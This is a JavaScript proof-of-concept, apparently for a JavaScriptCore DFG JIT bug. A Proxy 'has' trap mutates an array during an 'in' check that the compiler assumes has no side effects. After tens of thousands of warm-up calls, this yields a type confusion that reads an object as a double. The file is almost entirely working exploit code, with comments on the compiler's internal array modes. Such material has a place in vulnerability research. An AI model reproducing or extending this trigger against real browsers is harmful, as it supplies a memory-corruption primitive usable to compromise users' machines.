const MAX_ITERATIONS = 0xd0000;

let victim = [1.1, 2.2, 3.3];
victim[1] = 1;
victim.x = 1;
function arg()
{
    return arguments;
}

let argNoArray = arg(1);

let p = new Proxy({}, {
    has: function() {
        victim[0] = {};
    }
})

let argSlowArray = arg(2);
argSlowArray.__proto__ = p;
argSlowArray[0] = 1.1;
argSlowArray[1] = 1.1;

// print(describe(argSlowArray));
// readline();
let globalArr = [{}, 1.1];
globalArr[0] = argNoArray;
globalArr[1] = argSlowArray;

objStorageArray = {};
objStorageArray[0] = 1.1;
objStorageArray[0x1000] = 2.2;


objSlowArray = {};
objSlowArray[0] = 1.1;
objSlowArray.__proto__ = p;
// print(describe(objSlowArray));
// readline();
// let victim = [1.1, 2.2];


function opt(flag, idx)
{
  	// block 0
    let tmp = globalArr[0];
    tmp[0];  // CheckArray node(Array::Type is Array::DirectArguments, arrayMode will be (ArrayStorageShape, NonArray));
  	// tmp value mode is (ArrayStorage, NonArray)
  
    let tmp1;
    if(flag) { // block 1
      	// CheckArray node(array mode is (SlowPutArrayStorage, ArrayStorage))
        tmp1 = tmp;
        // tmp1 value mode is (ArrayStorage, NonArray) & (SlowPutArrayStorage, ArrayStorage) = ArrayStorage
    }
    else {  // block 2
        // CheckArray node(array mode is SlowPutArrayStorage)
        tmp1 = objSlowArray;
        // tmp1 value mode is (SlowPutArrayStorage, ArrayStorage)
        (11111)[11111111];  //ForceOSRExit, it won't transfer tmp1's value mode in block2 to block3
    }

  	// CheckArray node (array mode is ArrayStorage)
    let tmp2 = tmp1;  // block 3  
  	// tmp2 value mode is ArrayStorage
    if(!flag) {  // block 4
      	// CheckArray node (array mode is ArrayStorage)
        tmp2 = objStorageArray;
      	// tmp2 value mode is ArrayStorage
    }
  
		// blocak 5
  	// double array CheckArray
    victim[1] = 1.1;
    idx in tmp2;  // HasIndexedProperty node, compiler think it has no side effect, actually it has
    // tmp2 value mode is ArrayStorage
  
    let val = victim[0]; // boom, type confusion

    return [tmp1[0], val];  // CheckArray node(array mode is SlowPutArrayStorage)
  	// now the tmp1 value mode is ArrayStorage
}

for(let i=0; i<MAX_ITERATIONS; i++) {
    opt(false, i);
}


globalArr[0] = argSlowArray;
ret = opt(true, 0x10000);
print(ret[1]);


